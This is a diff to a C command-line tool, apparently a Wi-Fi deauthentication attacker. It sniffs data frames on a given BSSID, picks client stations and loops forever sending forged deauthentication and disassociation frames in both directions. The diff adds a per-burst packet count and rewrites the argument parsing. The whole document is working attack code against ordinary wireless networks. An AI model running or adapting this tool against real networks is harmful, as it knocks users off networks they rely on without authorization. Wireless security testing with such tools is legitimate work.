@@ -10,6 +10,7 @@
 #define MAX_PACKET_LENGTH 4096
 #define MAC_LENGTH 6
 #define MAX_MAC_LIST_ENTRIES 256
+#define DEFAULT_HOW_MANY_PACKETS_TO_SEND 42
 
 /* XXX: globals... why? Why, globals... why!? */
 static struct wif *_wi_in, *_wi_out;
@@ -199,41 +200,13 @@ int send_packet(uchar *buf, size_t count)
 //      a => Access Point
 //      b => BSSID
 // http://www.aircrack-ng.org/doku.php?id=wds
-uchar *get_macs_from_packet(char type, uchar *packet, int *is_wds)
+uchar *get_macs_from_packet(char type, uchar *packet)
 {
     uchar *bssid, *station, *access_point;
 
-    // Ad-Hoc Case!
     bssid = packet + 16;
     station = packet + 10;
     access_point = packet + 4;
-
-    // ToDS packet
-    if ((packet[1] & '\x01') && (!(packet[1] & '\x02')))
-    {
-        bssid = packet + 4;
-        station = packet + 10;
-        access_point = packet + 16;
-        *is_wds = 0;
-    }
-
-    // FromDS packet
-    if ((!(packet[1] & '\x01')) && (packet[1] & '\x02'))
-    {
-        station = packet + 4;
-        bssid = packet + 10;
-        access_point = packet + 16;
-        *is_wds = 0;
-    }
-
-    // WDS packet
-    if ((packet[1] & '\x01') && (packet[1] & '\x02'))
-    {
-        station = packet + 4;
-        bssid = packet + 10;
-        access_point = packet + 4;
-        *is_wds = 1;
-    }
 
     switch (type)
     {
@@ -424,7 +397,6 @@ int is_in_list(uchar *mac)
 uchar *get_target_deauth(uchar *bssid)
 {
     uchar *sniffed_packet = malloc(sizeof(uchar[MAX_PACKET_LENGTH]));
-    int t;
     // Sniffing for data frames to find targets
     int packet_length = 0;
     while (1)
@@ -439,21 +411,13 @@ uchar *get_target_deauth(uchar *bssid)
                 /*printf("packet_length: %d\n", packet_length);*/
                 /*printf("\n===========================================================\n");*/
             /*}*/
-            if (!memcmp(bssid, get_macs_from_packet('b', sniffed_packet, &t), MAC_LENGTH))
+            if (!memcmp(bssid, get_macs_from_packet('b', sniffed_packet), MAC_LENGTH))
             {
                 break;
             }
-            if (!memcmp(bssid, get_macs_from_packet('a', sniffed_packet, &t), MAC_LENGTH))
-            {
-                break;
-            }
-            if (!memcmp(bssid, get_macs_from_packet('s', sniffed_packet, &t), MAC_LENGTH))
-            {
-                break;
-            }
-        } while(1);
+        } while(packet_length < 22);
 
-        // \x08 - Beacon
+        // \x08 - Data, \x88 - QoS Data
         if (!memcmp(sniffed_packet, "\x08", 1) || !memcmp(sniffed_packet, "\x88", 1))
         {
             return sniffed_packet;
@@ -461,25 +425,22 @@ uchar *get_target_deauth(uchar *bssid)
     }
 }
 
-struct packet get_deauth_packet(int *state, uchar *bssid)
+void run_deauth(uchar *bssid, int how_many)
 {
     uchar * sniffed_packet_data = NULL;
-    uchar * mac_access_point = NULL;
     uchar * mac_bssid = NULL;
     uchar * mac_station = NULL;
-    int is_wds = 0;
     struct packet result_packet;
-    printf("\nstate: %d\n", *state);
+    int counter = 0;
     while(1)
     {
         sniffed_packet_data = get_target_deauth(bssid);
-        mac_access_point = get_macs_from_packet('a', sniffed_packet_data, &is_wds);
-        mac_station = get_macs_from_packet('s', sniffed_packet_data, &is_wds);
-        mac_bssid = get_macs_from_packet('b', sniffed_packet_data, &is_wds);
+        mac_station = get_macs_from_packet('s', sniffed_packet_data);
+        mac_bssid = get_macs_from_packet('b', sniffed_packet_data);
 
         if (
-            (with_whitelist == 1 && (is_in_list(mac_access_point) || is_in_list(mac_station))) ||
-            (with_whitelist == 0 && !(is_in_list(mac_access_point) || is_in_list(mac_station)))
+            (with_whitelist == 1 && is_in_list(mac_station)) ||
+            (with_whitelist == 0 && !is_in_list(mac_station))
         ) {
             continue;
         }
@@ -492,58 +453,34 @@ struct packet get_deauth_packet(int *state, uchar *bssid)
     print_mac(mac_list[0]);
     printf("bssid: ");
     print_mac(mac_bssid);
-    printf("access_point: ");
-    print_mac(mac_access_point);
     printf("mac_station: ");
     print_mac(mac_station);
 
-    int counter = 0;
-
-    switch (*state)
-    {
-    case 0:
-        printf("\nstate before: %d\n", *state);
-        printf("\nis_wds: %d\n", is_wds);
-
-        *state = 1;
-        result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 1);
-        for (counter = 0; counter < 15; counter++)
+    // dissasoc router -> station
+    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 1);
+    for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-        printf("\nstate after: %d\n", *state);
-    case 1:
-        printf("\nstate before: %d\n", *state);
-        printf("\nis_wds: %d\n", is_wds);
-        *state = 2;
-        result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 0);
-        for (counter = 0; counter < 15; counter++)
+    // deauth router -> station
+    result_packet = create_deauth_frame(mac_station, mac_bssid, mac_bssid, 0);
+    for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-        printf("\nstate after: %d\n", *state);
-    case 2:
-        printf("\nstate before: %d\n", *state);
-        printf("\nis_wds: %d\n", is_wds);
-        *state = 3;
-        result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 1);
-        for (counter = 0; counter < 15; counter++)
+    // dissasoc station -> router
+    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 1);
+    for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-        printf("\nstate after: %d\n", *state);
-    case 3:
-        printf("\nstate before: %d\n", *state);
-        printf("\nis_wds: %d\n", is_wds);
-        *state = 0;
-        result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 0);
-        for (counter = 0; counter < 15; counter++)
+    // deauth station -> router
+    result_packet = create_deauth_frame(mac_bssid, mac_station, mac_bssid, 0);
+    for (counter = 0; counter < how_many; counter++)
         send_packet(result_packet.data, result_packet.length);
-        printf("\nstate after: %d\n", *state);
-    }
 
     free(sniffed_packet_data);
-    return result_packet;
 }
 
 void print_help()
 {
     printf(
         "dw <interface> <bssid> [option] \n"
+        "Specify at least on of -w or -b options\n"
         "Options:\n"
         " -c <channel>  \n"
         "   Channel...  \n"
@@ -551,15 +488,17 @@ void print_help()
         "   Whitelist...\n"
         " -b <filename> \n"
         "   Blacklist...\n"
+        " -p <num>      \n"
+        "   How many packets to send \n"
+        "   Default 42.\n"
     );
 }
 
 int main(int argc, const char *argv[])
 {
     uchar *bssid;
-    int channel = 0, state = 0, t;
+    int channel = 0, t, how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
     const char *list_file = NULL;
-    struct packet packet_to_send;
 
     if (geteuid() != 0)
     {
@@ -567,32 +506,31 @@ int main(int argc, const char *argv[])
         return 1;
     }
 
-    if (argc < 3  || !memcmp(argv[1], "--help", 6) || !memcmp(argv[1], "-h", 2))
+    if (argc < 3 || !memcmp(argv[1], "--help", 6) || !memcmp(argv[1], "-h", 2))
     {
         print_help();
-        return 1;
+        return 0;
     }
 
     bssid = parse_mac((const uchar*) argv[2]);
 
-    for (t = 2; t < argc; t++)
+    for (t = 3; t < argc; t++)
     {
         if (!strcmp(argv[t], "-w") && argc >= t+1)
         {
             with_whitelist = 1;
-            list_file = argv[t+1];
+            list_file = argv[++t];
             load_list_file(list_file);
         }
         else if (!strcmp(argv[t], "-b") && argc >= t+1)
         {
             with_whitelist = 2;
-            list_file = argv[t+1];
+            list_file = argv[++t];
             load_list_file(list_file);
         }
-
-        if (!strcmp(argv[t], "-c") && argc >= t+1)
+        else if (!strcmp(argv[t], "-c") && argc >= t+1)
         {
-            channel = atoi(argv[t+1]);
+            channel = atoi(argv[++t]);
             if (channel > 0 && channel < 14)
             {
                 set_channel(channel);
@@ -602,6 +540,26 @@ int main(int argc, const char *argv[])
                 print_help();
                 return 1;
             }
+        }
+        else if (!strcmp(argv[t], "-p") && argc >= t+1)
+        {
+            how_many = atoi(argv[++t]);
+            if (how_many < 0 || how_many > 256)
+            {
+                printf("\nNumber of packets shoul be between 0 and 256.\n");
+                how_many = DEFAULT_HOW_MANY_PACKETS_TO_SEND;
+            }
+        }
+        else if (!strcmp(argv[t], "-h") || !strcmp(argv[t], "--help"))
+        {
+            print_help();
+            return 0;
+        }
+        else
+        {
+            printf("\nUnknown option %s \n", argv[t]);
+            print_help();
+            return 1;
         }
     }
 
@@ -645,9 +603,7 @@ int main(int argc, const char *argv[])
     /* Run Forest, run... */
     while (1)
     {
-        packet_to_send = get_deauth_packet(&state, bssid);
-
-        send_packet(packet_to_send.data, packet_to_send.length);
+        run_deauth(bssid, how_many);
         /* we shall print some statistics */
     }
 
